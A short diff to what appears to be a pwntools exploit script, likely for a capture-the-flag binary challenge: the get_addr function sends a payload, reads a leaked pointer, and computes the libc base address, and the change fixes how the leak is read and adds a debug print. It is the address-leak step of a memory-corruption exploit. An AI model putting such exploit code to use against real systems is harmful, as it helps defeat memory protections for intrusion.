@@ -34,7 +34,8 @@ def get_addr(func_name):
 
     p.sendline(payload)
 
-    received = p.recv()[14:].strip()
+    received = p.recvuntil('\n')[14:].strip()
+    print(received)
     leak = u64(received.ljust(8, b'\x00'))
     libc.address = leak - libc.symbols[func_name]
 
